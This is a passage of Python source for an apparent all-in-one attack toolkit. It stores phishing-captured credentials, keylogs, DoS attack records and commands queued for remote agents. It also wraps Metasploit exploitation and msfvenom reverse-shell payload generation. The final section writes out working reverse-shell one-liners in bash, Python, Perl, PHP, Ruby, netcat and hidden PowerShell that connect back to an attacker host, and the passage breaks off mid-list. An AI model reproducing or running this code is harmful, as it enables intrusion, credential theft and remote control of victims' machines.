    def resolve_domain(self, domain: str) -> Optional[str]:
        try:
            row = self.conn.execute(
                "SELECT ip FROM domain_hosting WHERE domain = ? AND active = 1",
                (domain,)
            ).fetchone()
            if row:
                return row['ip']
            
            row = self.conn.execute(
                "SELECT ip FROM dns_cache WHERE domain = ? AND expires_at > datetime('now')",
                (domain,)
            ).fetchone()
            if row:
                return row['ip']
            
            ip = socket.gethostbyname(domain)
            if ip:
                self.conn.execute(
                    "INSERT INTO dns_cache (domain, ip, expires_at) VALUES (?, ?, datetime('now', '+1 hour'))",
                    (domain, ip)
                )
                self.conn.commit()
                return ip
            return None
        except:
            return None
    
    def resolve_ip(self, ip: str) -> Optional[str]:
        try:
            row = self.conn.execute(
                "SELECT domain FROM domain_hosting WHERE ip = ? AND active = 1",
                (ip,)
            ).fetchone()
            if row:
                return row['domain']
            
            try:
                domain = socket.gethostbyaddr(ip)[0]
                if domain:
                    return domain
            except:
                pass
            return None
        except:
            return None
    
    def add_ssh_connection(self, conn: SSHConnection) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO ssh_connections 
                   (id, name, host, port, username, password_encrypted, key_path, status, created_at)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (conn.id, conn.name, conn.host, conn.port, conn.username,
                 conn.password, conn.key_path, conn.status, conn.created_at)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add SSH connection: {e}")
            return False
    
    def get_ssh_connections(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM ssh_connections ORDER BY name")
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_ssh_command(self, connection_id: str, command: str, output: str,
                       exit_code: int, execution_time: float):
        try:
            self.conn.execute(
                """INSERT INTO ssh_commands 
                   (connection_id, command, output, exit_code, execution_time)
                   VALUES (?, ?, ?, ?, ?)""",
                (connection_id, command, output[:5000], exit_code, execution_time)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log SSH command: {e}")
    
    def log_traffic(self, generator: TrafficGenerator, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO traffic_logs 
                   (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
                (generator.traffic_type, generator.target_ip, generator.target_port,
                 generator.duration, generator.packets_sent, generator.bytes_sent,
                 generator.status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log traffic: {e}")
    
    def log_nikto_scan(self, target: str, vulnerabilities: List[Dict], output_file: str,
                      scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO nikto_scans (target, vulnerabilities, output_file, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (target, json.dumps(vulnerabilities), output_file, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log Nikto scan: {e}")
    
    def save_phishing_link(self, link: PhishingLink) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO phishing_links (id, platform, phishing_url, template, created_at, clicks)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (link.id, link.platform, link.phishing_url, link.template, link.created_at, link.clicks)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                rows = self.conn.execute("SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC")
            else:
                rows = self.conn.execute("SELECT * FROM phishing_links ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str):
        try:
            self.conn.execute(
                """INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent)
                   VALUES (?, ?, ?, ?, ?)""",
                (link_id, username, password, ip_address, user_agent)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save credential: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        try:
            if link_id:
                rows = self.conn.execute(
                    "SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC",
                    (link_id,)
                )
            else:
                rows = self.conn.execute("SELECT * FROM captured_credentials ORDER BY timestamp DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?", (limit,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            stats['total_commands'] = self.conn.execute("SELECT COUNT(*) FROM command_history").fetchone()[0]
            stats['total_threats'] = self.conn.execute("SELECT COUNT(*) FROM threats").fetchone()[0]
            stats['total_managed_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips").fetchone()[0]
            stats['blocked_ips'] = self.conn.execute("SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1").fetchone()[0]
            stats['total_domain_hosts'] = self.conn.execute("SELECT COUNT(*) FROM domain_hosting").fetchone()[0]
            stats['total_ssh_connections'] = self.conn.execute("SELECT COUNT(*) FROM ssh_connections").fetchone()[0]
            stats['total_traffic_tests'] = self.conn.execute("SELECT COUNT(*) FROM traffic_logs").fetchone()[0]
            stats['total_phishing_links'] = self.conn.execute("SELECT COUNT(*) FROM phishing_links").fetchone()[0]
            stats['captured_credentials'] = self.conn.execute("SELECT COUNT(*) FROM captured_credentials").fetchone()[0]
            stats['total_keylogs'] = self.conn.execute("SELECT COUNT(*) FROM keylogs").fetchone()[0]
            stats['total_dos_attacks'] = self.conn.execute("SELECT COUNT(*) FROM dos_attacks").fetchone()[0]
            stats['total_agents'] = self.conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
            stats['total_deployments'] = self.conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
            stats['total_docker_scans'] = self.conn.execute("SELECT COUNT(*) FROM docker_scans").fetchone()[0]
            stats['total_cracking_jobs'] = self.conn.execute("SELECT COUNT(*) FROM cracking_jobs").fetchone()[0]
            stats['total_metasploit_sessions'] = self.conn.execute("SELECT COUNT(*) FROM metasploit_sessions").fetchone()[0]
            stats['total_re_jobs'] = self.conn.execute("SELECT COUNT(*) FROM reverse_engineering_jobs").fetchone()[0]
        except:
            pass
        return stats
    
    def verify_user(self, username: str, password: str) -> Optional[Dict]:
        try:
            password_hash = hashlib.sha256(password.encode()).hexdigest()
            row = self.conn.execute(
                "SELECT * FROM users WHERE username = ? AND password_hash = ?",
                (username, password_hash)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def create_session(self, user_id: int) -> str:
        try:
            session_id = secrets.token_urlsafe(32)
            expires_at = datetime.now() + timedelta(hours=24)
            self.conn.execute(
                "INSERT INTO sessions (id, user_id, expires_at) VALUES (?, ?, ?)",
                (session_id, user_id, expires_at.isoformat())
            )
            self.conn.commit()
            return session_id
        except:
            return None
    
    def verify_session(self, session_id: str) -> Optional[Dict]:
        try:
            row = self.conn.execute(
                """SELECT s.*, u.username, u.role 
                   FROM sessions s 
                   JOIN users u ON s.user_id = u.id 
                   WHERE s.id = ? AND s.expires_at > datetime('now')""",
                (session_id,)
            ).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def save_keylog(self, text: str, window: str = "", process: str = "", screenshot_path: str = ""):
        try:
            self.conn.execute(
                "INSERT INTO keylogs (text, window, process, screenshot_path) VALUES (?, ?, ?, ?)",
                (text[:5000], window[:100], process[:100], screenshot_path)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save keylog: {e}")
    
    def get_keylogs(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_spear_phishing_campaign(self, campaign: SpearPhishingCampaign) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO spear_phishing_campaigns 
                   (id, name, template, subject, from_email, targets, sent_count, open_count, click_count, status, created_at, scheduled_time)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (campaign.id, campaign.name, campaign.template, campaign.subject,
                 campaign.from_email, json.dumps(campaign.targets), campaign.sent_count,
                 campaign.open_count, campaign.click_count, campaign.status,
                 campaign.created_at, campaign.scheduled_time)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save campaign: {e}")
            return False
    
    def get_spear_phishing_campaigns(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM spear_phishing_campaigns ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def track_email_open(self, campaign_id: str, target_email: str):
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO email_tracking 
                   (campaign_id, target_email, opened, opened_at)
                   VALUES (?, ?, 1, CURRENT_TIMESTAMP)""",
                (campaign_id, target_email)
            )
            self.conn.commit()
            self.conn.execute(
                "UPDATE spear_phishing_campaigns SET open_count = open_count + 1 WHERE id = ?",
                (campaign_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to track email open: {e}")
    
    def track_email_click(self, campaign_id: str, target_email: str):
        try:
            self.conn.execute(
                """UPDATE email_tracking 
                   SET clicked = 1, clicked_at = CURRENT_TIMESTAMP 
                   WHERE campaign_id = ? AND target_email = ?""",
                (campaign_id, target_email)
            )
            self.conn.commit()
            self.conn.execute(
                "UPDATE spear_phishing_campaigns SET click_count = click_count + 1 WHERE id = ?",
                (campaign_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to track email click: {e}")
    
    def log_dos_attack(self, attack_type: str, target: str, port: int, duration: int,
                      packets_sent: int, status: str, executed_by: str = "system"):
        try:
            self.conn.execute(
                """INSERT INTO dos_attacks 
                   (attack_type, target, port, duration, packets_sent, status, executed_by)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (attack_type, target, port, duration, packets_sent, status, executed_by)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log DOS attack: {e}")
    
    def get_dos_attacks(self, limit: int = 10) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM dos_attacks ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def register_agent(self, agent_id: str, name: str, ip_address: str) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO agents (id, name, ip_address, status, last_heartbeat)
                   VALUES (?, ?, ?, 'online', CURRENT_TIMESTAMP)""",
                (agent_id, name, ip_address)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to register agent: {e}")
            return False
    
    def update_agent_heartbeat(self, agent_id: str):
        try:
            self.conn.execute(
                "UPDATE agents SET last_heartbeat = CURRENT_TIMESTAMP, status = 'online' WHERE id = ?",
                (agent_id,)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update agent heartbeat: {e}")
    
    def add_agent_command(self, agent_id: str, command: str) -> bool:
        try:
            self.conn.execute(
                "INSERT INTO agent_commands (agent_id, command) VALUES (?, ?)",
                (agent_id, command)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to add agent command: {e}")
            return False
    
    def get_pending_agent_commands(self, agent_id: str) -> List[Dict]:
        try:
            rows = self.conn.execute(
                "SELECT * FROM agent_commands WHERE agent_id = ? AND status = 'pending' ORDER BY id",
                (agent_id,)
            )
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_agent_command_result(self, command_id: int, result: str, status: str = "completed"):
        try:
            self.conn.execute(
                "UPDATE agent_commands SET result = ?, status = ?, executed_at = CURRENT_TIMESTAMP WHERE id = ?",
                (result[:5000], status, command_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update agent command result: {e}")
    
    def get_agents(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM agents ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def get_agent(self, agent_id: str) -> Optional[Dict]:
        try:
            row = self.conn.execute("SELECT * FROM agents WHERE id = ?", (agent_id,)).fetchone()
            return dict(row) if row else None
        except:
            return None
    
    def save_network_packet(self, source_ip: str, dest_ip: str, source_port: int,
                           dest_port: int, protocol: str, size: int, payload: str = ""):
        try:
            self.conn.execute(
                """INSERT INTO network_packets 
                   (source_ip, dest_ip, source_port, dest_port, protocol, size, payload)
                   VALUES (?, ?, ?, ?, ?, ?, ?)""",
                (source_ip, dest_ip, source_port, dest_port, protocol, size, payload[:1000])
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save network packet: {e}")
    
    def get_network_packets(self, limit: int = 100) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM network_packets ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def log_performance_metrics(self, cpu: float, memory: float, disk: float,
                               net_sent: int, net_recv: int, connections: int):
        try:
            self.conn.execute(
                """INSERT INTO performance_metrics 
                   (cpu_percent, memory_percent, disk_percent, network_sent, network_recv, connections_count)
                   VALUES (?, ?, ?, ?, ?, ?)""",
                (cpu, memory, disk, net_sent, net_recv, connections)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to log performance metrics: {e}")
    
    def get_performance_metrics(self, limit: int = 60) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM performance_metrics ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_deployment(self, deployment: Deployment) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO deployments 
                   (id, name, type, payload, target, created_at, delivered, opened, executed, data)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
                (deployment.id, deployment.name, deployment.type, deployment.payload,
                 deployment.target, deployment.created_at, deployment.delivered,
                 deployment.opened, deployment.executed, "{}")
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save deployment: {e}")
            return False
    
    def get_deployments(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM deployments ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def update_deployment_status(self, deployment_id: str, delivered: bool = None,
                                 opened: bool = None, executed: bool = None):
        try:
            updates = []
            if delivered is not None:
                updates.append(f"delivered = {1 if delivered else 0}")
            if opened is not None:
                updates.append(f"opened = {1 if opened else 0}")
            if executed is not None:
                updates.append(f"executed = {1 if executed else 0}")
            
            if updates:
                self.conn.execute(
                    f"UPDATE deployments SET {', '.join(updates)} WHERE id = ?",
                    (deployment_id,)
                )
                self.conn.commit()
        except Exception as e:
            print(f"Failed to update deployment: {e}")
    
    def save_clipboard(self, content: str, source: str = "system"):
        try:
            self.conn.execute(
                "INSERT INTO clipboard_history (content, source) VALUES (?, ?)",
                (content[:5000], source)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save clipboard: {e}")
    
    def get_clipboard_history(self, limit: int = 50) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM clipboard_history ORDER BY timestamp DESC LIMIT ?", (limit,))
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_docker_scan(self, image: str, vulnerabilities: List[Dict], severity: str,
                        scan_time: float, success: bool):
        try:
            self.conn.execute(
                """INSERT INTO docker_scans (image, vulnerabilities, severity, scan_time, success)
                   VALUES (?, ?, ?, ?, ?)""",
                (image, json.dumps(vulnerabilities), severity, scan_time, success)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to save Docker scan: {e}")
    
    def save_cracking_job(self, job_id: str, hash_type: str, hash_value: str, wordlist: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO cracking_jobs (job_id, hash_type, hash_value, wordlist, status)
                   VALUES (?, ?, ?, ?, 'pending')""",
                (job_id, hash_type, hash_value, wordlist)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save cracking job: {e}")
            return False
    
    def update_cracking_job(self, job_id: str, status: str, result: str = None, cracked: bool = False):
        try:
            self.conn.execute(
                """UPDATE cracking_jobs 
                   SET status = ?, result = ?, cracked = ?, completed_at = CURRENT_TIMESTAMP 
                   WHERE job_id = ?""",
                (status, result, cracked, job_id)
            )
            self.conn.commit()
        except Exception as e:
            print(f"Failed to update cracking job: {e}")
    
    def get_cracking_jobs(self, status: str = None) -> List[Dict]:
        try:
            if status:
                rows = self.conn.execute("SELECT * FROM cracking_jobs WHERE status = ? ORDER BY started_at DESC", (status,))
            else:
                rows = self.conn.execute("SELECT * FROM cracking_jobs ORDER BY started_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_metasploit_session(self, session_id: str, target_host: str, target_port: int,
                                exploit_module: str, payload_module: str) -> bool:
        try:
            self.conn.execute(
                """INSERT OR REPLACE INTO metasploit_sessions 
                   (session_id, target_host, target_port, exploit_module, payload_module, status, created_at)
                   VALUES (?, ?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)""",
                (session_id, target_host, target_port, exploit_module, payload_module)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save Metasploit session: {e}")
            return False
    
    def get_metasploit_sessions(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM metasploit_sessions ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def save_reverse_engineering_job(self, job_id: str, binary_path: str, analysis_type: str) -> bool:
        try:
            self.conn.execute(
                """INSERT INTO reverse_engineering_jobs (job_id, binary_path, analysis_type, status)
                   VALUES (?, ?, ?, 'pending')""",
                (job_id, binary_path, analysis_type)
            )
            self.conn.commit()
            return True
        except Exception as e:
            print(f"Failed to save RE job: {e}")
            return False
    
    def get_reverse_engineering_jobs(self) -> List[Dict]:
        try:
            rows = self.conn.execute("SELECT * FROM reverse_engineering_jobs ORDER BY created_at DESC")
            return [dict(row) for row in rows]
        except:
            return []
    
    def close(self):
        try:
            self.conn.close()
        except:
            pass

# =====================
# ADVANCED NETWORK SCANNER
# =====================
class AdvancedNetworkScanner:
    """Advanced network scanning with multiple techniques"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scan_results = {}
        self.active_scans = {}
        self.scan_lock = threading.Lock()
    
    def ping_scan(self, target: str, count: int = 4) -> CommandResult:
        """Perform ping scan on target"""
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def port_scan(self, target: str, ports: str = "1-1000", scan_type: str = "quick") -> CommandResult:
        """Perform port scan using nmap"""
        start_time = time.time()
        try:
            if not shutil.which('nmap'):
                return CommandResult(False, "nmap not installed", 0, "nmap not found")
            
            scan_map = {
                "quick": ['nmap', '-T4', '-F', target],
                "full": ['nmap', '-p-', target],
                "service": ['nmap', '-sV', target],
                "os": ['nmap', '-O', target],
                "udp": ['nmap', '-sU', target],
                "vuln": ['nmap', '--script', 'vuln', target],
                "stealth": ['nmap', '-sS', '-T2', target],
                "comprehensive": ['nmap', '-sS', '-sV', '-O', '-p-', target],
                "snmp": ['nmap', '-sU', '-p', '161', '--script', 'snmp-*', target],
                "smb": ['nmap', '-p', '445', '--script', 'smb-*', target],
                "ssh": ['nmap', '-p', '22', '--script', 'ssh-*', target],
                "ping": ['nmap', '-sn', target]
            }
            cmd = scan_map.get(scan_type, ['nmap', target])
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def comprehensive_scan(self, target: str) -> Dict:
        """Comprehensive scan of a target"""
        results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'ping': None,
            'ports': None,
            'os': None,
            'services': None
        }
        
        ping_result = self.ping_scan(target)
        results['ping'] = {'success': ping_result.success, 'output': ping_result.output}
        
        port_result = self.port_scan(target, "1-1000", "quick")
        results['ports'] = {'success': port_result.success, 'output': port_result.output}
        
        os_result = self.port_scan(target, "1-1000", "os")
        results['os'] = {'success': os_result.success, 'output': os_result.output}
        
        service_result = self.port_scan(target, "1-1000", "service")
        results['services'] = {'success': service_result.success, 'output': service_result.output}
        
        return results
    
    def scan_all_ips(self, ips: List[str], scan_type: str = "quick") -> Dict:
        """Scan multiple IPs"""
        results = {}
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(self.comprehensive_scan, ip): ip for ip in ips}
            for future in futures:
                ip = futures[future]
                try:
                    results[ip] = future.result()
                except Exception as e:
                    results[ip] = {'error': str(e)}
        return results
    
    def parse_nmap_output(self, output: str) -> Dict:
        """Parse nmap output for structured data"""
        parsed = {
            'open_ports': [],
            'os_info': None,
            'services': []
        }
        
        lines = output.split('\n')
        for line in lines:
            if '/tcp' in line or '/udp' in line:
                parts = line.split()
                if len(parts) >= 3:
                    port_proto = parts[0].split('/')
                    if len(port_proto) == 2:
                        try:
                            port = int(port_proto[0])
                            protocol = port_proto[1]
                            state = parts[1]
                            service = parts[2] if len(parts) > 2 else 'unknown'
                            
                            if state.lower() == 'open':
                                parsed['open_ports'].append({
                                    'port': port,
                                    'protocol': protocol,
                                    'service': service
                                })
                        except:
                            continue
            
            elif 'OS:' in line:
                os_parts = line.split('OS:')
                if len(os_parts) > 1:
                    parsed['os_info'] = os_parts[1].strip()
        
        return parsed

# =====================
# METASPLOIT INTEGRATION
# =====================
class MetasploitEngine:
    """Metasploit Framework integration for exploitation"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.rpc_host = config.get('metasploit.rpc_host', '127.0.0.1')
        self.rpc_port = config.get('metasploit.rpc_port', 55552)
        self.rpc_user = config.get('metasploit.rpc_user', 'msf')
        self.rpc_pass = config.get('metasploit.rpc_pass', 'password')
        self.msf_available = shutil.which('msfconsole') is not None or shutil.which('msfrpcd') is not None
        self.sessions = {}
    
    def is_available(self) -> bool:
        return self.msf_available
    
    def search_exploits(self, query: str) -> CommandResult:
        """Search for exploits in Metasploit database"""
        start_time = time.time()
        try:
            if not self.msf_available:
                return CommandResult(False, "Metasploit not installed", 0, "msfconsole not found")
            
            cmd = ['msfconsole', '-q', '-x', f'search {query}; exit']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def run_exploit(self, exploit: str, payload: str, target: str, port: int = 445,
                   options: Dict = None) -> CommandResult:
        """Run a Metasploit exploit against a target"""
        start_time = time.time()
        try:
            if not self.msf_available:
                return CommandResult(False, "Metasploit not installed", 0, "msfconsole not found")
            
            options = options or {}
            session_id = str(uuid.uuid4())[:8]
            
            commands = [f'use {exploit}']
            commands.append(f'set RHOSTS {target}')
            commands.append(f'set RPORT {port}')
            
            if payload:
                commands.append(f'set PAYLOAD {payload}')
            
            for key, value in options.items():
                commands.append(f'set {key} {value}')
            
            commands.append('run')
            commands.append('exit')
            
            cmd_str = '; '.join(commands)
            cmd = ['msfconsole', '-q', '-x', cmd_str]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            execution_time = time.time() - start_time
            
            self.db.save_metasploit_session(session_id, target, port, exploit, payload or 'default')
            self.sessions[session_id] = {
                'id': session_id,
                'target': target,
                'port': port,
                'exploit': exploit,
                'payload': payload
            }
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time,
                data={'session_id': session_id}
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def post_exploit(self, session_id: str, command: str) -> CommandResult:
        """Run post-exploitation commands on an active session"""
        start_time = time.time()
        try:
            if session_id not in self.sessions:
                return CommandResult(False, "Session not found", 0, "Invalid session ID")
            
            msf_commands = [
                f'sessions -i {session_id}',
                command,
                'exit'
            ]
            
            cmd_str = '; '.join(msf_commands)
            cmd = ['msfconsole', '-q', '-x', cmd_str]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def list_payloads(self) -> CommandResult:
        """List available Metasploit payloads"""
        start_time = time.time()
        try:
            if not self.msf_available:
                return CommandResult(False, "Metasploit not installed", 0, "msfconsole not found")
            
            cmd = ['msfconsole', '-q', '-x', 'show payloads; exit']
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def generate_payload(self, payload_type: str, lhost: str, lport: int,
                        output_file: str, format_type: str = "exe") -> CommandResult:
        """Generate a Metasploit payload using msfvenom"""
        start_time = time.time()
        try:
            if not shutil.which('msfvenom'):
                return CommandResult(False, "msfvenom not installed", 0, "msfvenom not found")
            
            payload = f"{payload_type}/meterpreter/reverse_tcp"
            cmd = [
                'msfvenom',
                '-p', payload,
                f'LHOST={lhost}',
                f'LPORT={lport}',
                '-f', format_type,
                '-o', output_file
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time,
                data={'payload_file': output_file}
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def start_handler(self, lhost: str, lport: int, payload: str = None) -> CommandResult:
        """Start a Metasploit handler for reverse connections"""
        start_time = time.time()
        try:
            if not self.msf_available:
                return CommandResult(False, "Metasploit not installed", 0, "msfconsole not found")
            
            payload = payload or "windows/meterpreter/reverse_tcp"
            
            commands = [
                'use exploit/multi/handler',
                f'set PAYLOAD {payload}',
                f'set LHOST {lhost}',
                f'set LPORT {lport}',
                'set ExitOnSession false',
                'exploit -j',
                'exit'
            ]
            
            cmd_str = '; '.join(commands)
            cmd = ['msfconsole', '-q', '-x', cmd_str]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            execution_time = time.time() - start_time
            
            return CommandResult(
                success=result.returncode == 0,
                output=result.stdout + result.stderr,
                execution_time=execution_time
            )
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    def get_sessions(self) -> List[Dict]:
        """Get active Metasploit sessions"""
        return self.db.get_metasploit_sessions()

# =====================
# POST-EXPLOITATION ENGINE
# =====================
class PostExploitationEngine:
    """Post-exploitation toolkit for maintaining access and gathering intelligence"""
    
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.reverse_shells = {}
        self.active_sessions = {}
    
    def generate_reverse_shell(self, lhost: str, lport: int, shell_type: str = "bash") -> str:
        """Generate reverse shell commands for different platforms"""
        shells = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'bash_alt': f"0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
            'python': f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'python2': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'perl': f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            'php': f"php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            'nc': f"nc -e /bin/sh {lhost} {lport}",
            'nc_mkfifo': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
            'powershell': f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
